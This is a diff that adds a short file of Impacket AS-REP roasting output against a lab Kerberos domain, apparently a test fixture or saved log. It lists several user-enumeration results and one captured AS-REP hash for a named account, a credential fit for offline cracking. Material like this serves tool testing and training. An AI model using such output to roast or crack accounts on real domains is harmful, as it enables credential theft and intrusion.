@@ -1,0 +1,8 @@
+Impacket v0.14.0.dev0+20261015.95810.75938fcb - Copyright Fortra, LLC and its affiliated companies 
+
+[-] User rowan.ash doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_KEY_EXPIRED(Password has expired; change password to reset)
+$krb5asrep$23$hazel.birch@ARBOR.LAB.TEST:fecbac379d7bc31e52c7c0d8b78a1a83$9453b46cabdd34ffe373643b67aabe38d9bc4ca23da0d847ae3c3dd4b553bb084c4b7a69e53455c109844a1697f2afb2cf23b21b87561a885ae69db115a94914780b1995766f46737191e44d712b0026780ee19c08522cbcfc758ec616c7cd8c38df54cd3a9477c50850480466fe318f497c3cdb64b91908e03ebfdd2ff29dbae59a242d556afb5215a5029d3aefc19289b8358aaee3afcfe5c50aa9381737692a57c18bd990237eff803e17687b195df61aa3d755b001500a3011274f4bbd72d4513ed19ed8a7e74eda
+[-] User willow.reed doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User elm.stone doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
